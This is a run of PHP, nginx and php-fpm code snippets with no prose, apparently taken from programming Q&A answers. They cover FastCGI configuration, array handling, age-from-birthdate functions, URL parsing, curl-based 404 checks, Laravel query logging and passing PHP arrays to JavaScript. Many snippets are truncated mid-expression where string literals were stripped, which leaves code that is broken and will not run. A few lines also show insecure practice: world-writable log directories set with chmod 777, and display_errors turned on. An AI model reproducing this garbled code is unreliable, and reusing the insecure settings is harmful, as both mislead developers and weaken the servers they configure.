fastcgi_param QUERY_STRING $query_string; fastcgi_param REQUEST_METHOD $request_method; ... fastcgi_param REDIRECT_STATUS 200;
$ diff fastcgi_params fastcgi.conf 1a2 > fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
location ~ \.php$ { include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; }
extern char **environ; int main(int argc, char **argv) { char *envvar; int i; int count = 0; while(FCGI_Accept() >= 0) { printf("Content-type: text/html\n\n" "<html><head><title>FastCGI Call Debug Tool</title></head>\n" "<body><h1>FastCGI Call Debugging Tool</h1>\n" "<p>Request number %d running on host <i>%s</i></p>\n" "<h2>Environment Variables</h2><p>\n", ++count, getenv("SERVER_NAME")); i = 0; envvar = environ[i]; while (envvar != NULL) { printf("%s<br/>",envvar); envvar = environ[++i]; } printf("</p></body></html>\n"); } return 0; }
$ sudo kate /etc/php5/fpm/php.ini short_open_tag = On $ sudo service php5-fpm restart $ sudo service nginx reload
fastcgi_param PATH_TRANSLATED $document_root$fastcgi_script_name;
location ~ \.php$ { fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass unix:/run/php5-fpm.sock; fastcgi_index index.php; include fastcgi.conf; }
location ~ \.php$ { fastcgi_split_path_info ^(.+\.php)(/.+)$; include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php5-fpm.sock; include fastcgi_params; }
fastcgi_max_temp_file_size 0; fastcgi_buffer_size 4K; fastcgi_buffers 64 4k;
location ~ \.php$ { try_files $uri /index.php =404; fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_max_temp_file_size 0; fastcgi_buffer_size 4K; fastcgi_buffers 64 4k; include fastcgi_params; }
location ~ \.php$ { fastcgi_split_path_info ^(.+\.php)(/.+)$; include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php5-fpm.sock; include fastcgi_params; }
server { listen 80; server_name test.test; root /var/www/html/{DIR_NAME}/public; location / { try_files $uri /index.php?$args; } location ~ \.php$ { try_files $uri =404; fastcgi_split_path_info ^(.+\.php)(/.+)$; fastcgi_pass unix:/run/php/php7.2-fpm.sock; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } }
Array ( [data] => Array ( [0] => Array ( [page_id] => 204725966262837 [type] => WEBSITE ) [1] => Array ( [page_id] => 163703342377960 [type] => COMMUNITY ) ) )
foreach ($results as $result) { echo $result->type; echo "<br>"; }
<?php echo "<pre>"; print_r($results); echo "</pre>"; ?>
<?php echo "<pre>"; print_r($results); echo "</pre>"; ?>
array(3) { [0]=> string(1) "a" [1]=> string(1) "b" [2]=> string(1) "c" }
foreach ($arr as $key=>$item){ echo "$key => $item <br>"; }
$parseablePhpCode = var_export($yourVariable,true);
$array = array("key1" => "value1", "key2" => "value2"); print_r($array); unset($array[ print_r($array); unset($array[ print_r($array);
Array ( [key1] => value1 [key2] => value2 ) Array ( [key2] => value2 ) Array ( )
function array_except($array, $keys) { return array_diff_key($array, array_flip((array) $keys)); }
$arr[$key1][$key2][$key3]=$value1; foreach ($arr as $key1 => $values) { foreach ($key1 as $key2 => $value) { unset($arr[$key1][$key2]); } }
$arr = array("key1" => "value1", "key2" => "value2", "key3" => "value3", "key4" => "value4");
$arr = array_diff($arr, ["value1"]); var_dump($arr);
{php} $var = $this->get_template_vars( var_dump($var); {/php}
{"<?php\n\$data =\n"|@cat:{$yourvariable|@var_export:true|@cat:";\n?>"}|@highlight_string:true}
{ddd($variable)} -> debug and die {ppp($variable)} -> debug only
$subject = $formatted = vsprintf( $timestamp = strtotime($formatted);
function datetotime ($date, $format = if ($format == if ($format == if ($format == if ($format == if ($format == if ($format == if ($format == if ($format == if ($format == return mktime(0, 0, 0, $month, $day, $year); }
class Date { public static function ausStrToTime($str) { $dateTokens = explode( return strtotime($dateTokens[1] . } }
$regex = $match = array(); if (preg_match($regex, $date, $match)) { if (strlen($match[3]) == 2) { $match[3] = } return mktime(0, 0, 0, $match[2], $match[1], $match[3]); } return strtotime($date);
$my_date = str_replace("/", ".", $my_date); $my_date = strtotime($my_date); $my_date = date("Y-m-d", $my_date);
<?php $date = $date = str_replace( $date = date( echo $date; ?>
<?php class fakeString { private $str; function __construct() { $this->str = ""; } function addA() { $this->str .= "a"; return $this; } function addB() { $this->str .= "b"; return $this; } function getStr() { return $this->str; } } $a = new fakeString(); echo $a->addA()->addB()->getStr();
public function doSomething() { return $this; } public function doSomethingElse() { return $this; }
<?php class DBManager { private $selectables = array(); private $table; private $whereClause; private $limit; public function select() { $this->selectables = func_get_args(); return $this; } public function from($table) { $this->table = $table; return $this; } public function where($where) { $this->whereClause = $where; return $this; } public function limit($limit) { $this->limit = $limit; return $this; } public function result() { $query[] = "SELECT"; if (empty($this->selectables)) { $query[] = "*"; } else { $query[] = join( } $query[] = "FROM"; $query[] = $this->table; if (!empty($this->whereClause)) { $query[] = "WHERE"; $query[] = $this->whereClause; } if (!empty($this->limit)) { $query[] = "LIMIT"; $query[] = $this->limit; } return join( } } $testOne = new DBManager(); $testOne->select()->from( echo $testOne->result(); echo $testOne->select()->from( $testTwo = new DBManager(); $testTwo->select()->from( echo $testTwo->result(); $testThree = new DBManager(); $testThree->select( )->from( echo $testThree->result(); ?>
class Maker { private static $result = null; private static $delimiter = private static $data = []; public static function words($words) { if( !empty($words) && count($words) ) { foreach ($words as $w) { self::$data[] = $w; } } return new static; } public static function concate($delimiter) { self::$delimiter = $delimiter; foreach (self::$data as $d) { self::$result .= $d.$delimiter; } return new static; } public static function get() { return rtrim(self::$result, self::$delimiter); } }
echo Maker::words([ echo "<br />"; echo Maker::words([
$fruits = new Arr(array("lemon", "orange", "banana", "apple")); $fruits->change_key_case(CASE_UPPER)->filter()->walk(function($value,$key) { echo $key. });
<?php use \Dsheiko\Extras\Arrays; $res = Arrays::chain([1, 2, 3]) ->map(function($num){ return $num + 1; }) ->filter(function($num){ return $num > 1; }) ->reduce(function($carry, $num){ return $carry + $num; }, 0) ->value();
<?php use \Dsheiko\Extras\Strings; $res = Strings::from( " 12345 " ) ->replace("/1/", "5") ->replace("/2/", "5") ->trim() ->substr(1, 3) ->get(); echo $res;
<?php use \Dsheiko\Extras\Any; $res = Any::chain(new \ArrayObject([1,2,3])) ->toArray() ->map(function($num){ return [ "num" => $num ]; }) ->reduce(function($carry, $arr){ $carry .= $arr["num"]; return $carry; }, "") ->replace("/2/", "") ->then(function($value){ if (empty($value)) { throw new \Exception("Empty value"); } return $value; }) ->value(); echo $res;
class JobModel implements JobInterface{ protected $job; public function __construct(Model $job){ $this->job = $job; } public function find($id){ return $this->job->find($id); } public function with($data=[]){ $this->job = $this->job->with($params); return $this; } } class JobController{ protected $job; public function __construct(JobModel $job){ $this->job = $job; } public function index(){ $this->job->with([ } }
[default] listen = /var/run/php-fpm/default.sock listen.allowed_clients = 127.0.0.1 listen.owner = webusr listen.group = webusr listen.mode = 0666 user = webusr group = webusr pm = dynamic pm.max_children = 50 pm.start_servers = 5 pm.min_spare_servers = 5 pm.max_spare_servers = 35 pm.status_path = /php/fpm/status ping.path = /php/fpm/ping request_terminate_timeout = 30s request_slowlog_timeout = 10s slowlog = /var/log/php-fpm/default/slow.log chroot = /var/www/sites/webusr catch_workers_output = yes env[HOSTNAME] = mapsvr.mapking.com php_flag[display_errors] = on php_admin_value[error_log] = /var/log/php-fpm/default/error.log php_admin_flag[log_errors] = on
server { listen 80 default_server; server_name _; charset utf-8; access_log /var/log/nginx/access.log rest; include conf.d/drops.conf.inc; location / { root /var/www/sites/webusr/htdocs; index index.html index.htm index.php; } # location ~ \.php$ { root /var/www/sites/webusr/htdocs; include /etc/nginx/fastcgi_params; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /htdocs/$fastcgi_script_name; if (-f $request_filename) { fastcgi_pass unix:/var/run/php-fpm/default.sock; } } location = /php/fpm/status { include /etc/nginx/fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_pass unix:/var/run/php-fpm/default.sock; } location = /php/fpm/ping { include /etc/nginx/fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_pass unix:/var/run/php-fpm/default.sock; } # error_page 500 502 503 504 /50x.html; location = /50x.html { root /usr/share/nginx/html; } }
; Redirect worker stdout and stderr into main error log. If not set, stdout and ; stderr will be redirected to /dev/null according to FastCGI specs. ; Default Value: no catch_workers_output = yes
php_admin_value[error_log] = /var/log/fpm-php.www.log php_admin_flag[log_errors] = on
php_flag[display_errors] is commented php_flag[display_errors] = on log will be at /var/log/php-fpm/www-error.log
ls -lah /var/log/php-fpm/ chown -R webusr:webusr /var/log/php-fpm/ chmod -R 777 /var/log/php-fpm/
<? $a="localhost"; function body(){ global $a; echo $a; } function head(){ global $a; echo $a; } function footer(){ global $a; echo $a; } ?>
class MyTest { protected $a; public function __construct($a) { $this->a = $a; } public function head() { echo $this->a; } public function footer() { echo $this->a; } } $a = $obj = new MyTest($a);
$variable = 5; function name() { global $variable; $value = $variable + 5; return $value; }
other.php function name() { require_once __DIR__ . }
define("myconstant", "value"); class globalVars { static $a = false; static $b = 0; static $c = array( } function test($num) { if (!globalVars::$a) { $returnVal = globalVars::$a = true; } else { $returnVal = } return $returnVal; } echo test(9); ---> The value of 9 + 0 + 5 is 14. echo "<br>"; echo globalVars::$a; ----> 1
$foo = "New"; $closure = (function($bar) use ($foo) { echo "$foo $bar"; })("York");
if (first_condition) { } else { if (second_condition) { } }
if (first_condition) { } elseif (second_condition) { }
if (first_condition): elseif (second_condition): endif;
$parts = parse_url($url); parse_str($parts[ echo $query[
$url = "https: $query_str = parse_url($url, PHP_URL_QUERY); parse_str($query_str, $query_params); print_r($query_params);
function get_valueFromStringUrl($url , $parameter_name) { $parts = parse_url($url); if(isset($parts[ { parse_str($parts[ if(isset($query[$parameter_name])) { return $query[$parameter_name]; } else { return null; } } else { return null; } }
$url = "https: echo get_valueFromStringUrl($url , "email");
$url = $_SERVER["REQUEST_URI"]; $email = str_replace("/path/to/file.php?email=", "", $url);
$url = "https: parse_str(parse_url($url)[ echo $params[
preg_match("/&?email=([^&]+)/", $url, $matches); echo $matches[1];
$email = preg_replace("/^https?:\/\/.*\?.*email=([^&]+).*$/", "$1", $url);
$uri = $_SERVER["REQUEST_URI"]; $uriArray = explode( $page_url = $uriArray[1]; $page_url2 = $uriArray[2]; echo $page_url; <- see the value
var getUrlParameter = function getUrlParameter(sParam) { var sPageURL = decodeURIComponent(window.location.search.substring(1)), sURLVariables = sPageURL.split( sParameterName, i; for (i = 0; i < sURLVariables.length; i++) { sParameterName = sURLVariables[i].split( if (sParameterName[0] === sParam) { return sParameterName[1] === undefined ? true : sParameterName[1]; } } }; var email = getUrlParameter(
$valid = @fsockopen($url, 80, $errno, $errstr, 30);
$handle = curl_init($url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); $response = curl_exec($handle); /* Check for 404 (file not found). */ $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE); if($httpCode == 404) { } curl_close($handle);
/** This is a modified version of code from "stuart at sixletterwords dot com", at 14-Sep-2005 04:52. This version tries to emulate get_headers() function at PHP4. I think it works fairly well, and is simple. It is not the best emulation available, but it works. Features: - supports (and requires) full URLs. - supports changing of default port in URL. - stops downloading from socket as soon as end-of-headers is detected. Limitations: - only gets the root URL (see line with "GET / HTTP/1.1"). - don */ if(!function_exists( { function get_headers($url,$format=0) { $url=parse_url($url); $end = "\r\n\r\n"; $fp = fsockopen($url[ if ($fp) { $out = "GET / HTTP/1.1\r\n"; $out .= "Host: ".$url[ $out .= "Connection: Close\r\n\r\n"; $var = fwrite($fp, $out); while (!feof($fp)) { $var.=fgets($fp, 1280); if(strpos($var,$end)) break; } fclose($fp); $var=preg_replace("/\r\n\r\n.*\$/", $var=explode("\r\n",$var); if($format) { foreach($var as $i) { if(preg_match( $v[$parts[1]]=$parts[2]; } return $v; } else return $var; } } }
Array ( [0] => HTTP/1.1 200 OK [Date] => Sat, 29 May 2004 12:28:14 GMT [Server] => Apache/1.3.27 (Unix) (Red-Hat/Linux) [Last-Modified] => Wed, 08 Jan 2003 23:11:55 GMT [ETag] => "3f80f-1b6-3e1cb03b" [Accept-Ranges] => bytes [Content-Length] => 438 [Connection] => close [Content-Type] => text/html )
$headers = get_headers($url, 1); if ($headers[0] == } if ($headers[0] == }
function is_404($url) { $handle = curl_init($url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); $response = curl_exec($handle); /* Check for 404 (file not found). */ $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE); curl_close($handle); if ($httpCode >= 200 && $httpCode < 300) { return false; } else { return true; } }
if(($twitter_XML_raw=file_get_contents($timeline))==false){ list($version,$status_code,$msg) = explode( switch($status_code) { case 200: $error_status="200: Success"; break; case 401: $error_status="401: Login failure. Try logging out and back in. Password are ONLY used when posting."; break; case 400: $error_status="400: Invalid request. You may have exceeded your rate limit."; break; case 404: $error_status="404: Not found. This shouldn break; case 500: $error_status="500: Twitter servers replied with an error. Hopefully they break; case 502: $error_status="502: Twitter servers may be down or being upgraded. Hopefully they break; case 503: $error_status="503: Twitter service unavailable. Hopefully they break; default: $error_status="Undocumented error: " . $status_code; break; }
$url = "http: $start_time = microtime(TRUE); $headers = get_headers($url); echo $headers[0]."<br>"; $end_time = microtime(TRUE); echo $end_time - $start_time."<br>"; $start_time = microtime(TRUE); $response = file_get_contents($url); echo $http_response_header[0]."<br>"; $end_time = microtime(TRUE); echo $end_time - $start_time."<br>"; $start_time = microtime(TRUE); $handle = curl_init($url); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($handle, CURLOPT_NOBODY, 1); $response = curl_exec($handle); /* Check for 404 (file not found). */ $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE); echo $httpCode."<br>"; curl_close($handle); $end_time = microtime(TRUE); echo $end_time - $start_time."<br>";
set_time_limit(120); $curl = curl_init($url); curl_setopt($curl, CURLOPT_NOBODY, true); $result = curl_exec($curl); set_time_limit(ini_get( curl_close($curl);
<?php function get_url_status($url, $timeout = 10) { $ch = curl_init(); $opts = array(CURLOPT_RETURNTRANSFER => true, CURLOPT_URL => $url, CURLOPT_NOBODY => true, CURLOPT_TIMEOUT => $timeout); curl_setopt_array($ch, $opts); curl_exec($ch); $status = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); echo $status; if ($status == } get_url_status( ?>
<?php $url= $ch = curl_init($url); curl_setopt($ch, CURLOPT_HEADER, true); curl_setopt($ch, CURLOPT_NOBODY, true); curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.4"); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_TIMEOUT,10); curl_setopt($ch, CURLOPT_ENCODING, "gzip"); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch); echo $httpcode; ?>
$handle = curl_init($uri); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($handle,CURLOPT_HTTPHEADER,array ("Accept: application/rdf+xml")); curl_setopt($handle, CURLOPT_NOBODY, true); curl_exec($handle); $httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE); if($httpCode == 200||$httpCode == 303) { echo "you might get a reply"; } curl_close($handle);
function check_404($url) { $headers=get_headers($url, 1); if ($headers[0]!= }
$ch = @curl_init(); @curl_setopt($ch, CURLOPT_URL, @curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1"); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); @curl_setopt($ch, CURLOPT_TIMEOUT, 10); $response = @curl_exec($ch); $errno = @curl_errno($ch); $error = @curl_error($ch); $response = $response; $info = @curl_getinfo($ch); return $info[
function URLIsValid($URL){ $headers = @get_headers($URL); preg_match("/ [45][0-9]{2} /", (string)$headers[0] , $match); return count($match) === 0; }
<?php namespace Vendor\Your\Class\Namespace; use Illuminate\Routing\UrlGenerator; class Classname { protected $url; public function __construct(UrlGenerator $url) { $this->url = $url; } public function methodName() { $this->url->to( } }
echo url()->current(); echo url()->full(); echo url()->previous();
use Illuminate\Support\Facades\Storage; $url = Storage::url( echo url($url);
use Illuminate\Support\Facades\URL; echo URL::to( echo URL::current();
{{ url( {{ asset( {{ route( <!-- Styles --> <link href="{{ asset( <!-- Login link --> <a class="nav-link" href="{{ route( <!-- Login Post URL --> <form method="POST" action="{{ url(
$uri = $request->path(); $url = $request->url(); $url = $request->fullUrl(); asset() app_path();
namespace Symfony\Component\HttpFoundation; /** * {@inheritdoc} */ protected function prepareBaseUrl() { $baseUrl = $this->server->get( if (false === strpos($this->server->get( return rtrim(dirname($baseUrl), } return $baseUrl; }
foreach ($array as $i => $value) { unset($array[$i]); }
foreach($blah_blah as $blah) { $foo = array(); $foo = null; }
$foo = array(1,2,3); $bar = &$foo; $foo = array(); var_dump($bar);
$foo = array(1,2,3); $bar = &$foo; unset($foo); $foo = array(); var_dump($bar);
function special_sort_my_array(&$array) { $temporary_list = create_assoziative_special_list_out_of_array($array); sort_my_list($temporary_list); unset($array); foreach($temporary_list as $k => $v) { $array[$k] = $v; } }
for ($i = 0; $i < count($array); $i++) { unset($array[$i]); }
<?php $arr = array(); array_push($arr , "foo"); unset($arr); $arr = array(); ?>
DB::listen( function ($sql, $bindings, $time) { } );
class BeforeAnyDbQueryMiddleware { public function handle($request, Closure $next) { DB::enableQueryLog(); return $next($request); } public function terminate($request, $response) { dd( DB::getQueryLog() ); } }
DB::enableQueryLog(); $laQuery = DB::getQueryLog(); $lcWhatYouWant = $laQuery[0][ DB::disableQueryLog();
DB::listen( function ($sql) { foreach ($sql->bindings as $i => $binding) { if ($binding instanceof \DateTime) { $sql->bindings[$i] = $binding->format( } else { if (is_string($binding)) { $sql->bindings[$i] = " } } } $query = str_replace(array( $query = vsprintf($query, $sql->bindings); $logFile = fopen( storage_path( ); fwrite($logFile, date( fclose($logFile); } );
\Event::listen( echo var_dump($query->sql); var_dump($query->bindings); var_dump($query->time); echo });
DB::listen(function($sql) { $LOG_TABLE_NAME = foreach ($sql->bindings as $i => $binding) { if ($binding instanceof \DateTime) { $sql->bindings[$i] = $binding->format( } else { if (is_string($binding)) { $sql->bindings[$i] = " } } } $query = str_replace(array( $query = vsprintf($query, $sql->bindings); if(stripos($query, $toLog = new LogModel(); $toLog->uId = 100; $toLog->sql = $query; $toLog->save(); } });
use Monolog\Logger; use Monolog\Handler\StreamHandler; $log = new Logger( $log->pushHandler(new StreamHandler(storage_path(). $log->addInfo($query, $data);
function destroySession() { $params = session_get_cookie_params(); setcookie(session_name(), $params["path"], $params["domain"], $params["secure"], $params["httponly"] ); session_destroy(); }
function foo($blah, $x = "some value", $y = "some other value") { }
foo("blah", null, "test"); foo("blah", "", "test");
function foo($blah, $x = null, $y = null) { if (null === $x) { $x = "some value"; } if (null === $y) { $y = "some other value"; } code here! }
public function __construct($params = null) { if ($params instanceof SOMETHING) { } else if (is_string($params)) { } else if (is_array($params)) { } else if (func_num_args() == 3) { $args = func_get_args(); } else if (func_num_args() == 5) { $args = func_get_args(); } else { throw new InvalidArgumentException("Could not figure out parameters!"); } }
function foo(array $args = array()) { $x = !isset($args[ $y = !isset($args[ ... }
function image(array $img) { $defaults = array( ); $img = array_merge($defaults, $img); }
function foo($blah, $y = "some other value", $x = "some value")
function foo($blah, $x = false, $y = false) { if (!$x) $x = "some value"; if (!$y) $y = "some other value"; }
protected function baseItemQuery(BoolQuery $boolQuery, $limit=1000, $sort = [], $offset = 0, $remove_dead=true) { if ($limit===null) $limit =1000; if ($sort===null) $sort = []; if ($offset===null) $offset = 0; ...
function foo($blah, $x = null, $y = null, $z = null) { if (null === $x || "" === $x) { $x = "some value"; } if (null === $y || "" === $y) { $y = "some other value"; } if (null === $z || "" === $z) { $z = "some other value"; } code here! }
<?php function info($name="George",$age=18) { echo "$name is $age years old.<br>"; } info(); info("Nick"); info("Mark",17); ?>
$dob = strtotime(str_replace("/","-",$birthdayDate)); $tdate = time(); $age = 0; while( $tdate > $dob = strtotime( { ++$age; } return $age;
return floor((time() - strtotime($birthdayDate))/31556926);
<?php $birthDate = "12/17/1983"; $birthDate = explode("/", $birthDate); $age = (date("md", date("U", mktime(0, 0, 0, $birthDate[0], $birthDate[1], $birthDate[2]))) > date("md") ? ((date("Y") - $birthDate[2]) - 1) : (date("Y") - $birthDate[2])); echo "Age is:" . $age; ?>
$tz = new DateTimeZone( $age = DateTime::createFromFormat( ->diff(new DateTime( ->y;
$date = new DateTime($bithdayDate); $now = new DateTime(); $interval = $now->diff($date); return $interval->y;
function getAge($dob,$condate){ $birthdate = new DateTime(date("Y-m-d", strtotime(implode( $today= new DateTime(date("Y-m-d", strtotime(implode( $age = $birthdate->diff($today)->y; return $age; } $dob= $condate= echo getAge($dob,$condate);
Current Time: 2015-10-22 10:04:23 getAge( getAge( getAge( getAge( getAge(
function calcutateAge($dob){ $dob = date("Y-m-d",strtotime($dob)); $dobObject = new DateTime($dob); $nowObject = new DateTime(); $diff = $dobObject->diff($nowObject); return $diff->y; }
function getAge($date) { $now = explode("-", date( $dob = explode("-", $date); $dif = $now[0] - $dob[0]; if ($dob[1] > $now[1]) { $dif -= 1; } elseif ($dob[1] == $now[1]) { if ($dob[2] > $now[2]) { $dif -= 1; } elseif ($dob[2] == $now[2]) { $dif = $dif." Happy Birthday!"; }; }; return $dif; } getAge(
function getAge($date) { return intval(substr(date( } getAge(
Note: Dates in the m/d/y or d-m-y formats are disambiguated by looking at the separator between the various components: if the separator is a slash (/), then the American m/d/y is assumed; whereas if the separator is a dash (-) or a dot (.), then the European d-m-y format is assumed. If, however, the year is given in a two digit format and the separator is a dash (-, the date string is parsed as y-m-d. To avoid potential ambiguity, it DateTime::createFromFormat() when possible.
function calculate_age($date) { $date = new \Carbon\Carbon($date); return (int) $date->diffInYears(); }
function dob ($birthday){ list($day,$month,$year) = explode("/",$birthday); $year_diff = date("Y") - $year; $month_diff = date("m") - $month; $day_diff = date("d") - $day; if ($day_diff < 0 || $month_diff < 0) $year_diff--; return $year_diff; }
/* * Get age from dob * @param dob string The dob to validate in mysql format (yyyy-mm-dd) * @return integer The age in years as of the current date */ function getAge($dob) { list($year, $month, $day) = explode("-", $dob); $year_diff = date("Y") - $year; $month_diff = date("m") - $month; $day_diff = date("d") - $day; if ($day_diff < 0 || $month_diff < 0) $year_diff--; return $year_diff; }
function getAge($birthdate, $pattern = { $patterns = array( ); $now = new DateTime(); $in = DateTime::createFromFormat($patterns[$pattern], $birthdate); $interval = $now->diff($in); return $interval->y; } echo getAge(
print floor((time() - strtotime("1971-11-20")) / (60*60*24*365));
function ageDOB($y=2014,$m=12,$d=31){ date_default_timezone_set("Asia/Jakarta"); $ageY = date("Y")-intval($y); $ageM = date("n")-intval($m); $ageD = date("j")-intval($d); if ($ageD < 0){ $ageD = $ageD += date("t"); $ageM--; } if ($ageM < 0){ $ageM+=12; $ageY--; } if ($ageY < 0){ $ageD = $ageM = $ageY = -1; } return array( }
function getAge($dob) { list($year, $month, $day) = explode("-", $dob); $year_diff = date("Y") - $year; $month_diff = date("m") - $month; $day_diff = date("d") - $day; if ( ($month_diff < 0 ) || ($month_diff === 0 && $day_diff < 0)) $year_diff--; return $year_diff; }
$dob = strtotime(str_replace("/","-",$birthdayDate)); $tdate = time(); return date(
function get_age($date, $units= { $modifier = date( $seconds = (time()-strtotime($date)); $years = (date( switch($units) { case return $seconds; case return round($seconds/60); case return round($seconds/60/60); case return round($seconds/60/60/24); case return ($years*12+date( case return ($years/10); case return ($years/100); case default: return $years; } }
$birthday_date = $age = date( if (strtotime(date( { $age--; }
$dob_date = "01"; $dob_month = "01"; $dob_year = "1970"; $year = gmdate("Y"); $month = gmdate("m"); $day = gmdate("d"); $age = $year-$dob_year; if($month < $dob_month) { $age = $age-1; } else if($month == $dob_month && $day >= $dob_date) { $age = $age; } else if($month == $dob_month && $day < $dob_date) { $age = $age-1; } else { $age = $age; }
<?php function age($birthdate) { $birthdate = strtotime($birthdate); $now = time(); $age = 0; while ($now >= ($birthdate = strtotime("+1 YEAR", $birthdate))) { $age++; } return $age; } echo age(implode("-",array_reverse(explode("/", echo age("-10 YEARS") ?>
SELECT username ,date_of_birth ,(PERIOD_DIFF( DATE_FORMAT(CURDATE(), ,(PERIOD_DIFF( DATE_FORMAT(CURDATE(), FROM users
$geboortedatum = 1980-01-30 00:00:00; echo leeftijd($geboortedatum) function leeftijd($geboortedatum) { $leeftijd = date( if (date( $leeftijd = $leeftijd-1; elseif (date( if (date( $leeftijd = $leeftijd-1; return $leeftijd; }
$birthDate = date( $currentDate = date( $birthDate = explode("-", $birthDate); $currentDate = explode("-", $currentDate); $birthDate[0] = ltrim($birthDate[0], $currentDate[0] = ltrim($currentDate[0], $age = $currentDate[2] - $birthDate[2]; if($birthDate[1] > $currentDate[1]){ $age = $age - 1; } else if($birthDate[1] == $currentDate[1]){ if($birthDate[0] > $currentDate[0]){ $age - 1; } } echo $age;
$now = date[ $birthday = $age = floor(($now-$birtday)/10000);
$hours_in_day = 24; $minutes_in_hour= 60; $seconds_in_mins= 60; $birth_date = new DateTime("1988-07-31T00:00:00"); $current_date = new DateTime(); $diff = $birth_date->diff($current_date); echo $years = $diff->y . " years " . $diff->m . " months " . $diff->d . " day(s)"; echo "<br/>"; echo $months = ($diff->y * 12) + $diff->m . " months " . $diff->d . " day(s)"; echo "<br/>"; echo $weeks = floor($diff->days/7) . " weeks " . $diff->d%7 . " day(s)"; echo "<br/>"; echo $days = $diff->days . " days"; echo "<br/>"; echo $hours = $diff->h + ($diff->days * $hours_in_day) . " hours"; echo "<br/>"; echo $mins = $diff->h + ($diff->days * $hours_in_day * $minutes_in_hour) . " minutest"; echo "<br/>"; echo $seconds = $diff->h + ($diff->days * $hours_in_day * $minutes_in_hour * $seconds_in_mins) . " seconds"; echo "<br/>";
<?php $birth_date = strtotime("1988-03-22"); $now = time(); $age = $now-$birth_date; $a = $age/60/60/24/365.25; echo floor($a); ?>
$oDateNow = new DateTime(); $oDateBirth = new DateTime($sDateBirth); $oDateIntervall = $oDateNow->diff($oDateBirth); echo $oDateIntervall->y;
Array ( [0] => 001-1234567 [1] => 1234567 [2] => 12345678 [3] => 12345678 [4] => 12345678 [5] => AP1W3242 [6] => AP7X1234 [7] => AS1234 [8] => MH9Z2324 [9] => MX1234 [10] => TN1A3242 [11] => ZZ1234 )
var cities = [ "Aberdeen", "Ada", "Adamsville", "Addyston", "Adelphi", "Adena", "Adrian", "Akron", "Albany" ];
function js_str($s) { return } function js_array($array) { $temp = array_map( return } echo
<script type= <?php $php_array = array( $js_array = json_encode($php_array); echo "var javascript_array = ". $js_array . ";\n"; ?> </script>
<script type="text/javascript"> var tempArray = <?php echo json_encode($php_array); ?>; alert(tempArray[0].Key); </script>
<?php $phpArray = array( 0 => 001-1234567, 1 => 1234567, 2 => 12345678, 3 => 12345678, 4 => 12345678, 5 => 6 => 7 => 8 => 9 => 10 => 11 => ) ?>
<script type="text/javascript"> var jArray= <?php echo json_encode($phpArray ); ?>; for(var i=0;i<12;i++){ alert(jArray[i]); } </script>
<script> <?php $php_array = array( $code_array = json_encode($php_array); ?> var array_code = <?php echo $code_array; ?>; console.log(array_code); </script>
function js_str($s) { return } function js_array($array, $keys_array) { foreach ($array as $key => $value) { $new_keys_array = $keys_array; $new_keys_array[] = $key; if(is_array($value)) { echo foreach($new_keys_array as $key) { echo } echo js_array($value, $new_keys_array); } else { echo foreach($new_keys_array as $key) { echo } echo } } } echo js_array($php_array, array());
<?php $phpArray=array(1,2,3,4,5,6); ?> <div id="arrayCon" style="width:300px;"></div> <script type="text/javascript"> var jsArray = new Array(); <?php $numArray=count($phpArray); for($i=0;$i<$numArray;$i++){ echo "jsArray[$i] = ". $phpArray[$i] . ";\n"; } ?> $(" </script>
var data = JSON.parse( decodeURIComponent( "<?=rawurlencode(json_encode($data));?>" ) ); console.log(data);
<?php $data = file_get_contents( $data = simplexml_load_string($data); $articles = array(); foreach($data->channel->item as $item){ $articles[] = array( ); } $output=""; for($i = 0; $i < sizeof($articles); $i++){ if($i != 0) $output.=" $output.=$articles[$i][ $output.=$articles[$i][ $output.=$articles[$i][ $output.=$articles[$i][ $output.=$articles[$i][ $output.=$articles[$i][ } echo $output; ?> $(document).ready(function(e) { var prodlist= []; var attrlist= []; $.ajax({ type: "get", url: "php/fromupnorthrss.php", data: {feeding: "feedstest"}, }).done(function(data) { prodlist= data.split( for(var i = 0; i < prodlist.length; i++){ attrlist= prodlist[i].split( alert(attrlist[0]); } }); });
<?php $php_array = ["The","quick","brown","fox","jumps","over","the","lazy","dog"]; $php_fake_array = "The,quick,brown,fox,jumps,over,the,lazy,dog"; ?> <script type="text/javascript"> js_array = </script>
<?php $php_array = file( $php_fake_array = ""; foreach ($php_array as $cell){ $php_fake_array .= $cell.",,,,,"; } ?> <script type="text/javascript"> js_array = </script>
